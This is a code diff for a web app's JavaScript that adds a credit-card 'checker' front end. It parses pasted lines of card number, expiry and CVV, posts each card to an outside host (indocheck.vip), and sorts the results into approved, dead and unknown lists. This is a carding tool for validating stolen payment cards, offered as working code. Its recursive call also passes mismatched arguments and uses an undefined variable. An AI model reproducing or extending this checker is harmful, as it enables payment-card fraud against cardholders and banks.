@@ -3,11 +3,10 @@ import 'simplebar/dist/simplebar.css';
 import Swal from 'sweetalert2';
 
 
-
-
 document.addEventListener('Notifier', event => {
     Swal.fire({
         title: event.detail.title,
+        timer: 4000,
         text: event.detail.text,
         icon: event.detail.icon,
         confirmButtonColor: "#3085d6",
@@ -207,11 +206,219 @@ class ThemeCustomizer {
 }
 
 
+class CheckedGate1Card{
+    init(){
+        const startCheck = document.getElementById('start-check');
+        if (startCheck) {
+            startCheck.addEventListener('click', () => {
+                var no = 1;
+                var regex = /\d{1,16}\|\d{1,2}\|\d{1,4}\|\d{1,4}/g;
+                var cardInputElement = document.getElementById('card-input');
+                var delim = document.getElementById('delim').value;
+                var cardInputValue = cardInputElement.value;
+                var ccall = cardInputValue.match(regex);
+                // console.log(cardInputValue)
+                if(ccall != null){
+                    var card = this.filterCard(cardInputValue, delim);
+                    var cardInputElement = document.getElementById('card-input');
+                    cardInputElement.value = card.join("\n");
+                    cardInputElement.disabled = true;
+                    this.resetResult();
+                    var startButton = document.getElementById('start-check');
+                    startButton.disabled = true; 
+                    var stopButton = document.getElementById('stop-check');
+                    stopButton.disabled = false; 
+                    this.ExecuteNya(card, 0, no);
+                }else{
+                    Swal.fire({
+                        title: "Can't Check",
+                        timer: 4000,
+                        allowEscapeKey: true,
+                        allowOutsideClick: true,
+                        icon: "error",
+                        text: "Please drop an Credit Card in the fields!",
+                        confirmButtonText: "Continue"
+                    });
+                    return false;
+                }
+            });
+        }
+
+    }
+
+    filterCard(mp, delim){
+        var mps = mp.split("\n");
+        // console.log(mps);
+        var lstMP = new Array();
+        for(var i=0;i<mps.length;i++){
+            var infoMP = mps[i].split(delim);
+            if (infoMP.length >= 4) {
+                // Ambil dan trim informasi dari array
+                var ccnum = infoMP[0].trim();
+                var ccmon = infoMP[1].trim();
+                var ccyear = infoMP[2].trim();
+                var ccvv = infoMP[3].trim();
+                
+                // Gabungkan informasi dalam format yang diinginkan dan tambahkan ke lstMP
+                lstMP.push(ccnum + '|' + ccmon + '|' + ccyear + '|' + ccvv);
+            }
+        }
+        return lstMP;
+    }
+
+    resetResult() {
+        // Mengatur konten HTML elemen dengan ID 'res_die' dan 'res_unkw' menjadi string kosong
+        var resDieElement = document.getElementById('res_die');
+        var resUnkwElement = document.getElementById('res_unkw');
+        
+        if (resDieElement) resDieElement.innerHTML = '';
+        if (resUnkwElement) resUnkwElement.innerHTML = '';
+    
+        // Mengatur teks elemen dengan ID 'deadres' dan 'unknownres' menjadi '0'
+        var deadResElement = document.getElementById('deadres');
+        var unknownResElement = document.getElementById('unknownres');
+        
+        if (deadResElement) deadResElement.textContent = '0';
+        if (unknownResElement) unknownResElement.textContent = '0';
+    }
+
+    stopLoading(bool, bool2, msg){
+        // $('#loading').attr('src', '');
+        // var str = $('#checkStatus').html();
+        // $('#checkStatus').html(str.replace('Checking','Stopped')).removeClass('bg-success').addClass('bg-danger');
+        var cardInputElement = document.getElementById('card-input');
+
+        cardInputElement.disabled = false;
+        var startButton = document.getElementById('start-check');
+        var stopButton = document.getElementById('stop-check');
+
+        // Mengatur atribut 'disabled' pada elemen 'start' menjadi false (mengaktifkan tombol)
+        if (startButton) {
+            startButton.disabled = false;
+        }
+
+        // Mengatur atribut 'disabled' pada elemen 'stop' menjadi true (menonaktifkan tombol)
+        if (stopButton) {
+            stopButton.disabled = true;
+        }
+        if(bool && !bool2){
+            Swal.fire({
+                title: "Checking Complete",
+                timer: 4000,
+                icon: "success",
+                allowEscapeKey: true,
+                allowOutsideClick: true,
+                text: "Thanks",
+                // html: true,
+                confirmButtonText: "Continue"
+            });
+        } else if (!bool && bool2){
+            Swal.fire({
+                title: "Can't Check",
+                timer: 4000,
+                allowEscapeKey: true,
+                allowOutsideClick: true,
+                icon: "error",
+                text: msg,
+                confirmButtonText: "Continue"
+            });
+        }else{
+            // ajaxCall.abort();
+        }
+            // updateTitle('Stopped');
+    }
+
+    updateTextBox(carMP){
+        var cardInputElement = document.getElementById('card-input');
+    
+        // Ambil nilai elemen input dan pisahkan dengan baris baru
+        var card = cardInputElement.value.split("\n");
+        
+        // Hapus item dari array
+        card = this.removeFromArray(card, carMP);
+        
+        // Gabungkan array menjadi string dengan baris baru dan atur nilai elemen input
+        cardInputElement.value = card.join("\n");
+    }
+
+    removeFromArray(array, value) {
+        return array.filter(function(item) {
+            return item !== value;
+        });
+    }
+
+    ExecuteNya(card, mp, no){
+        if(card.length<1 || mp>=card.length){
+            this.stopLoading(true, false);
+            return false;
+        }
+        this.updateTextBox(card[mp]);
+
+        var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+        var resUnkwElement = document.getElementById('res_unkw');
+        var resDieElement = document.getElementById('res_die');
+        var resApproveElement = document.getElementById('res_approve');
+
+        var data = new URLSearchParams();
+        data.append('ajax', '1');
+        data.append('do', 'check');
+        data.append('data', encodeURIComponent(card[mp]));
+        data.append('delim', encodeURIComponent(delim));
+
+    // Permintaan menggunakan fetch
+    fetch('https://indocheck.vip/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-CSRF-TOKEN': csrfToken
+        },
+        body: data.toString()
+    })
+    .then(response => response.json())
+    .then(data => {
+        switch (data.error) {
+            case -1:
+                mp++;
+                resUnkwElement.innerHTML += data.msg + '<br />';
+                count_unkUp();
+                break;
+            case 2:
+                mp++;
+                resDieElement.innerHTML += data.msg + '<br />';
+                // yourCreditsElement.textContent = data.bal;
+                count_dieUp();
+                break;
+            case 5:
+                this.stopLoading(false, true, data.msg);
+                return;
+            case 0:
+                mp++;
+                resApproveElement.innerHTML += data.msg + '<br />';
+                // yourCreditsElement.textContent = data.bal;
+                count_liveUp();
+                break;
+        }
+        no++;
+        this.ExecuteNya(card, mp, delim, no);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        this.stopLoading(false, false);
+    });
+        // this.ExecuteNya(card, mp, no);
+    }
+    
+}
+
+
 document.addEventListener('livewire:navigated', async () => {
     const themeCustomizer = new ThemeCustomizer();
     const app = new App()
+    const checkGate1 = new CheckedGate1Card();
+
     themeCustomizer.init();
     app.init();
+    checkGate1.init();
     
 });
 
